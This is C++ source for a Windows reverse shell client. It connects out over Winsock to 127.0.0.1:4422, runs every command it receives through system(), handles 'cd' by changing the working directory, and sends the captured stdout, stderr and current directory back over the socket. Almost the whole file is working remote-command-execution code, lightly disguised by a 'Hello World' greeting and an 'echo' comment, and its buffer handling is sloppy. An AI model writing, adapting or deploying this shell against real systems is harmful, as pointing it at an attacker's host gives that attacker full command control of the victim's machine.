#include <fstream>
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <direct.h>
#include <algorithm>
#include <tuple>

#pragma comment (lib, "ws2_32.lib")

using namespace std;

string convertToString(char* a, int size)
{
	int i;
	string s = "";
	for (i = 0; i < size; i++) {
		s = s + a[i];
	}
	return s;
}

std::tuple<string, string> execute(const std::string& command) {

	if (command.find("cd ", 0) == 0) {
		string cd = command;
		cd.erase(0, 3);
		cout << "cd \n" << cd;
		_chdir(cd.c_str());
		return make_tuple("cd", "");
	}
	else{

	system((command + " 1> temp 2> temp2").c_str());

	std::ifstream ifs("temp");
	std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
	ifs.close(); // must close the inout stream so the file can be cleaned up
	if (std::remove("temp") != 0) {
		perror("Error deleting temp1orary file");
	}
	std::ifstream ifs2("temp2");
	std::string ret2{ std::istreambuf_iterator<char>(ifs2), std::istreambuf_iterator<char>() };
	ifs2.close(); // must close the inout stream so the file can be cleaned up
	if (std::remove("temp2") != 0) {
		perror("Error deleting temp1orary file");
	}
	return make_tuple(ret, ret2);
	}
}

int main()
{
    cout << "Hello World!\n";

   
	string ip = "127.0.0.1";



	// initialze winsock

	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	int wsOk = WSAStartup(ver, &wsData);

	if (wsOk != 0) {
		cerr << "Cant initilize winsock, quitting" << endl;
		return 1;
	}

	// create a socket

	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

	if (sock == INVALID_SOCKET) {
		cerr << "Cant create socket, quitting" << endl;
		WSACleanup();
		return 1;
	}

	// bind socket

	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(4422);
	inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

	// connect to server

	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR) {
		cerr << "Cant connect to server, Err #" << WSAGetLastError() << endl;
		closesocket(sock);
		WSACleanup();
		return 1;
	}




	// while loop: accpet and echo message back to client

	char buf[100];
	char buf2[4096];
	
	while (true) {
	
		int bytesRecv = recv(sock, buf, 100, 0);

		

		int buf_size = sizeof(buf) / sizeof(char);
	

		string cmd = string(buf);
		
	

		string stdout1;
		string stderr1;
		tie(stdout1, stderr1) = execute(cmd);
		string output2 = stdout1 + stderr1;

		string pwdout;
		string pwderr;
		tie(pwdout, pwderr) = execute("cd");
		string pwd = pwdout + pwderr;
		pwd = pwd.substr(0, pwd.size() - 1);

		string output = output2 + "\n" + pwd + "--> ";
		


		if (bytesRecv == SOCKET_ERROR) {
			cerr << "Error in recv(), Quitting" << endl;
			break;
		}

		if (bytesRecv == 0) {
			cout << "Client disconnected" << endl;
			break;
		}


	
		char tab2[4096];
		strncpy_s(tab2, output.c_str(), sizeof(tab2));
		tab2[sizeof(tab2) - 1] = 0;


	

		send(sock, tab2, sizeof(tab2), 0);

	}

	// close socket

	closesocket(sock);

	// cleanup winsock

	WSACleanup();
}
